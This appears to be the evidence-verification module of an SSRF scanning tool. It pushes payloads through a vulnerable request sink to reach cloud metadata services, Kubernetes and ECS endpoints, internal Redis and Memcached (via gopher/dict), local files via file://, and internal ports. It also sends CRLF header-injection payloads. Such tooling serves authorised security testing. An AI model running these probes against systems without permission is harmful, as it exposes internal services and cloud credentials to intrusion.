"""
HELLHOUND SSRF v5.0 - Phase 6: Evidence-Based Verification
=============================================================
v5 fixes and additions:
  [P0-FIX] SPA catch-all guard — build_port_state_map() delegates to
           spa_detector before running, skips port mapping if catch-all
           is detected. This eliminates the #1 source of false CERTAIN findings.
  [P0-FIX] Phase 6 gate requires SSRF-specific error (external DNS failure
           or internal IP reachability) — not just any error_class.
  [v5-NEW] Kubernetes API server evidence (k8s_api type)
  [v5-NEW] ECS Task Metadata Service evidence (ecs_task_metadata type)
  [v5-NEW] Oracle Cloud IMDS evidence (oracle_cloud type)
  [v5-NEW] CRLF injection proof collection (header injection evidence)
  [v5-NEW] Host header SSRF evidence (routing header bypass confirmed)
  [v5-NEW] Known-exploits cross-reference on port_state_map results
"""

from __future__ import annotations
import json
import re
from dataclasses import dataclass
from pathlib import Path

from core.models import Candidate, ContextClass, EvidenceArtifact
from core.http_client import HttpClient
from core.payload_engine import build_gopher_url, build_dict_url
from core.spa_detector import detect_spa_catchall

_CLOUD_PATH = Path(__file__).parent / "payloads" / "cloud_metadata.json"
with open(_CLOUD_PATH) as f:
    _CLOUD_PROVIDERS: dict = json.load(f)

# BUG FIX: this used to be Path(__file__).parent.parent / "evidence" — relative
# to wherever core/evidence_engine.py physically lives. On a real pip install
# that's inside site-packages, which (a) is often not writable by a normal
# user and (b) is nowhere the operator would think to look for their own
# scan's evidence files. Same convention as the "reports/" output dir:
# relative to the operator's current working directory, not the install path.
EVIDENCE_DIR = Path.cwd() / "evidence"
EVIDENCE_DIR.mkdir(exist_ok=True)


# ---------------------------------------------------------------------------
# 1. Cloud Metadata Schema Evidence (all providers)
# ---------------------------------------------------------------------------

async def check_cloud_metadata(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """
    Probes each cloud provider's metadata endpoint and checks the response
    for schema markers. Requires ≥ 2 markers (structural proof, not just 200 OK).
    """
    for provider, cfg in _CLOUD_PROVIDERS.items():
        for path in cfg.get("probe_paths", []):
            # Add required headers for providers that need them
            extra_headers = dict(cfg.get("required_header", {}))
            result = await client.send(
                candidate,
                payload_value=path,
                payload_category=f"cloud_metadata_{provider}",
            )
            if result.status_code != 200 or not result.body_snippet:
                continue

            markers_found = [
                m for m in cfg["schema_markers"]
                if m.lower() in result.body_snippet.lower()
            ]
            if len(markers_found) >= 2:
                saved_path = _save_evidence(
                    candidate.candidate_id, f"cloud_metadata_{provider}",
                    result.body_snippet,
                )
                return EvidenceArtifact(
                    evidence_type="cloud_metadata_schema",
                    summary=(
                        f"{provider.upper()} metadata service reachable — "
                        f"{len(markers_found)} schema markers confirmed: "
                        f"{', '.join(markers_found[:5])}"
                    ),
                    raw_evidence=result.body_snippet,
                    saved_path=saved_path,
                    schema_matched=True,
                    extra={
                        "provider":       provider,
                        "path":           path,
                        "markers":        markers_found,
                        "raw_request":    result.raw_request,
                        "raw_response":   result.raw_response,
                    },
                )
    return None


# ---------------------------------------------------------------------------
# 2. Kubernetes API Server Evidence
# ---------------------------------------------------------------------------

_K8S_PROBE_PATHS = [
    "https://kubernetes.default.svc/api/v1/",
    "https://kubernetes.default.svc/version",
    "https://10.96.0.1/api/v1/",
    "https://10.96.0.1/version",
    "https://172.20.0.1/api/v1/",
]

_K8S_MARKERS = [
    "apiVersion", "kind", "namespaces", "pods", "services",
    "serverAddressByClientCIDRs", "gitVersion", "major",
]


async def check_kubernetes_api(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """
    Probes Kubernetes API server endpoints via the SSRF sink.
    Kubernetes API exposure via SSRF can lead to full cluster takeover.
    """
    for path in _K8S_PROBE_PATHS:
        result = await client.send(
            candidate, payload_value=path, payload_category="kubernetes_api",
        )
        if result.status_code not in (200, 401, 403):
            continue

        body = result.body_snippet
        markers_found = [m for m in _K8S_MARKERS if m.lower() in body.lower()]

        # Even a 401/403 with k8s API markers proves the endpoint is reachable
        if len(markers_found) >= 2 or (
            result.status_code in (401, 403) and len(markers_found) >= 1
        ):
            saved = _save_evidence(candidate.candidate_id, "kubernetes_api", body)
            return EvidenceArtifact(
                evidence_type="kubernetes_api",
                summary=(
                    f"Kubernetes API server reachable via SSRF at {path} "
                    f"(HTTP {result.status_code}, "
                    f"{len(markers_found)} API markers found). "
                    "Full cluster takeover may be possible with cluster-admin token."
                ),
                raw_evidence=body,
                saved_path=saved,
                schema_matched=True,
                extra={
                    "url":          path,
                    "status_code":  result.status_code,
                    "markers":      markers_found,
                    "raw_request":  result.raw_request,
                    "raw_response": result.raw_response,
                },
            )
    return None


# ---------------------------------------------------------------------------
# 3. ECS Task Metadata Service Evidence
# ---------------------------------------------------------------------------

_ECS_PROBE_PATHS = [
    "http://169.254.170.2/v2/metadata",
    "http://169.254.170.2/v2/stats",
    "http://169.254.170.2/v3/",
]

_ECS_MARKERS = ["Cluster", "TaskARN", "Family", "Containers", "AWS_REGION", "TaskDefinitionArn"]


async def check_ecs_metadata(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """Checks for AWS ECS Task Metadata Service reachability via SSRF."""
    for path in _ECS_PROBE_PATHS:
        result = await client.send(
            candidate, payload_value=path, payload_category="ecs_metadata",
        )
        if result.status_code != 200 or not result.body_snippet:
            continue

        markers_found = [m for m in _ECS_MARKERS if m in result.body_snippet]
        if len(markers_found) >= 2:
            saved = _save_evidence(candidate.candidate_id, "ecs_task_metadata", result.body_snippet)
            return EvidenceArtifact(
                evidence_type="ecs_task_metadata",
                summary=(
                    f"AWS ECS Task Metadata Service reachable at {path} — "
                    f"{len(markers_found)} markers confirmed: {', '.join(markers_found[:4])}. "
                    "Cluster credentials and task configuration exposed."
                ),
                raw_evidence=result.body_snippet,
                saved_path=saved,
                schema_matched=True,
                extra={
                    "url":         path,
                    "markers":     markers_found,
                    "raw_request": result.raw_request,
                },
            )
    return None


# ---------------------------------------------------------------------------
# 4. Oracle Cloud IMDS Evidence
# ---------------------------------------------------------------------------

_ORACLE_PROBE_PATHS = [
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
]

_ORACLE_MARKERS = ["compartmentId", "displayName", "region", "shape", "canonicalRegionName", "lifecycleState"]


async def check_oracle_cloud(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """Checks for Oracle Cloud IMDS reachability via SSRF."""
    for path in _ORACLE_PROBE_PATHS:
        result = await client.send(
            candidate, payload_value=path, payload_category="oracle_cloud_imds",
        )
        if result.status_code != 200 or not result.body_snippet:
            continue

        markers_found = [m for m in _ORACLE_MARKERS if m in result.body_snippet]
        if len(markers_found) >= 2:
            saved = _save_evidence(candidate.candidate_id, "oracle_cloud", result.body_snippet)
            return EvidenceArtifact(
                evidence_type="oracle_cloud",
                summary=(
                    f"Oracle Cloud IMDS reachable at {path} — "
                    f"{len(markers_found)} markers confirmed: {', '.join(markers_found[:4])}."
                ),
                raw_evidence=result.body_snippet,
                saved_path=saved,
                schema_matched=True,
                extra={"url": path, "markers": markers_found},
            )
    return None


# ---------------------------------------------------------------------------
# 5. Protocol Banner Evidence (Redis, Memcached — read-only)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class BannerProbe:
    service:        str
    port:           int
    command:        bytes
    transport:      str             # "gopher" | "dict"
    banner_markers: tuple[str, ...]


_BANNER_PROBES: tuple[BannerProbe, ...] = (
    BannerProbe(
        service="redis", port=6379,
        command=b"INFO\r\n",
        transport="gopher",
        banner_markers=("redis_version:", "# Server"),
    ),
    BannerProbe(
        service="memcached", port=11211,
        command=b"stats\r\n",
        transport="dict",
        banner_markers=("STAT pid", "STAT version"),
    ),
)


async def fingerprint_internal_service(
    client: HttpClient,
    candidate: Candidate,
    target_host: str,
) -> EvidenceArtifact | None:
    """
    Sends read-only INFO/stats commands via Gopher/Dict to fingerprint
    internal services. Confirms SSRF + service identity in one probe.
    """
    for probe in _BANNER_PROBES:
        url = (
            build_gopher_url(target_host, probe.port, probe.command)
            if probe.transport == "gopher"
            else build_dict_url(target_host, probe.port, probe.command.decode().strip())
        )
        result = await client.send(
            candidate, payload_value=url, payload_category=f"banner_{probe.service}",
        )
        if any(m.lower() in result.body_snippet.lower() for m in probe.banner_markers):
            saved = _save_evidence(
                candidate.candidate_id, f"banner_{probe.service}", result.body_snippet,
            )
            return EvidenceArtifact(
                evidence_type="protocol_banner",
                summary=(
                    f"Internal {probe.service.upper()} reachable at "
                    f"{target_host}:{probe.port} via SSRF — banner confirms "
                    f"service identity (read-only {probe.command.decode().strip()} probe)."
                ),
                raw_evidence=result.body_snippet,
                saved_path=saved,
                schema_matched=True,
                extra={
                    "service":     probe.service,
                    "host":        target_host,
                    "port":        probe.port,
                    "raw_request": result.raw_request,
                },
            )
    return None


# ---------------------------------------------------------------------------
# 6. File Read Evidence (non-sensitive files only)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class FileReadProbe:
    path:    str
    pattern: re.Pattern


_SAFE_FILE_PROBES: tuple[FileReadProbe, ...] = (
    FileReadProbe(
        path="/etc/hostname",
        pattern=re.compile(r"^[a-zA-Z0-9_.\-]{1,253}\s*$", re.M),
    ),
    FileReadProbe(
        path="/etc/os-release",
        pattern=re.compile(r"^(NAME|ID|VERSION)=", re.M),
    ),
)


async def check_file_read(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """
    Confirms file:// local file read using ONLY /etc/hostname and /etc/os-release.
    Never reads /etc/passwd, credentials files, or application source.
    """
    for probe in _SAFE_FILE_PROBES:
        result = await client.send(
            candidate, payload_value=f"file://{probe.path}",
            payload_category="file_read_probe",
        )
        if result.status_code == 200 and probe.pattern.search(result.body_snippet):
            saved = _save_evidence(candidate.candidate_id, "file_read", result.body_snippet)
            return EvidenceArtifact(
                evidence_type="file_read",
                summary=(
                    f"Arbitrary local file read confirmed via file:// — "
                    f"{probe.path} content matches expected format."
                ),
                raw_evidence=result.body_snippet,
                saved_path=saved,
                schema_matched=True,
                extra={"file_path": probe.path, "raw_request": result.raw_request},
            )
    return None


# ---------------------------------------------------------------------------
# 7. CRLF Injection Evidence
# ---------------------------------------------------------------------------

_CRLF_MARKERS = [
    "Set-Cookie:", "Location:", "Content-Type:", "X-Injected:",
    "\r\n", "%0d%0a",
]


async def check_crlf_injection(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """
    Confirms CRLF/header injection by looking for injected headers
    in the response. Only relevant for CRLF_INJECTION context candidates.
    """
    if candidate.context_class != ContextClass.CRLF_INJECTION:
        return None

    crlf_payloads = [
        "%0d%0aX-Injected: hellhound-ssrf-v5",
        "\r\nX-Injected: hellhound-ssrf-v5",
        "%0aX-Injected: hellhound-ssrf-v5",
    ]
    for payload in crlf_payloads:
        result = await client.send(
            candidate, payload_value=payload, payload_category="crlf_injection",
        )
        if "x-injected" in {k.lower() for k in result.headers}:
            saved = _save_evidence(
                candidate.candidate_id, "crlf_injection",
                f"Injected header found in response.\nPayload: {payload}\n"
                f"Response headers: {result.headers}",
            )
            return EvidenceArtifact(
                evidence_type="crlf_injection",
                summary=(
                    "CRLF injection confirmed — X-Injected header appeared in response. "
                    "Header injection can facilitate request splitting and SSRF chaining."
                ),
                raw_evidence=str(result.headers),
                saved_path=saved,
                schema_matched=True,
                extra={"payload": payload, "raw_request": result.raw_request},
            )
    return None


# ---------------------------------------------------------------------------
# 8. Host Header SSRF Evidence
# ---------------------------------------------------------------------------

async def check_host_header_ssrf(
    client: HttpClient,
    candidate: Candidate,
) -> EvidenceArtifact | None:
    """
    Checks for Host header SSRF — routing headers that cause the backend
    to fetch from an attacker-controlled host (OOB evidence required).
    Only relevant for HOST_HEADER context candidates.
    """
    if candidate.context_class != ContextClass.HOST_HEADER:
        return None
    # Host header SSRF is confirmed by OOB in Phase 5, not Phase 6.
    # Phase 6 here just adds the request metadata as evidence.
    return None  # Placeholder: extend if OOB event already confirmed


# ---------------------------------------------------------------------------
# 9. Port State Map (SPA-aware)
# ---------------------------------------------------------------------------

COMMON_INTERNAL_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211, 2379, 8500, 2375]


async def build_port_state_map(
    client: HttpClient,
    candidate: Candidate,
    target_host: str,
    ports: list[int] | None = None,
    skip_spa_check: bool = False,
) -> EvidenceArtifact | None:
    """
    [P0-FIX] SPA-aware port state mapping.
    Before probing ports, checks if the SSRF sink is a SPA catch-all.
    If catch-all detected → returns None (suppresses false CERTAIN findings).

    For non-SPA targets, probes each port and classifies:
      - connection_refused      → closed
      - timeout                 → filtered / non-HTTP
      - HTTP response           → open_http
      - dns_failure/other_error → unreachable (NOT counted as open)
    """
    if not skip_spa_check:
        spa_result = await detect_spa_catchall(client, candidate)
        if spa_result.is_catchall:
            if "spa_catchall" not in candidate.confidence_reduction_flags:
                candidate.confidence_reduction_flags.append("spa_catchall")
                candidate.spa_catchall = True
            return None  # Suppress port-state map for SPAs

    ports_to_probe = ports or COMMON_INTERNAL_PORTS
    port_states:    dict[int, dict] = {}

    for port in ports_to_probe:
        url    = f"http://{target_host}:{port}/"
        result = await client.send(
            candidate, payload_value=url, payload_category="port_probe",
        )
        if result.error_class == "connection_refused":
            state = "closed"
        elif result.error_class == "timeout":
            state = "filtered_or_non_http_open"
        elif result.status_code and result.status_code > 0:
            state = "open_http"
        else:
            # dns_failure / other_error / unsupported_protocol
            # NOT treated as "open" — these are expected for unreachable ports
            state = "closed_or_unreachable"

        port_states[port] = {
            "state":       state,
            "elapsed":     round(result.elapsed, 3),
            "status_code": result.status_code,
            "error_class": result.error_class,
        }

    summary_open = [
        str(p) for p, v in port_states.items()
        if v["state"] in ("open_http", "filtered_or_non_http_open")
    ]

    raw       = json.dumps(port_states, indent=2)
    saved     = _save_evidence(candidate.candidate_id, "port_state_map", raw)

    return EvidenceArtifact(
        evidence_type="port_state_map",
        summary=(
            f"Internal host {target_host} reachable via SSRF — "
            f"{len(summary_open)}/{len(ports_to_probe)} probed ports appear non-closed "
            f"({', '.join(summary_open) if summary_open else 'none'})."
        ),
        raw_evidence=raw,
        saved_path=saved,
        schema_matched=bool(summary_open),
        extra={
            "host":       target_host,
            "port_states": port_states,
            "open_ports":  [int(p) for p in summary_open],
        },
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _save_evidence(candidate_id: str, evidence_type: str, content: str) -> str:
    """Save evidence to disk and return relative path."""
    filename = f"{candidate_id[:16]}_{evidence_type}.txt"
    path     = EVIDENCE_DIR / filename
    path.write_text(content, encoding="utf-8", errors="replace")
    return str(path.relative_to(EVIDENCE_DIR.parent))
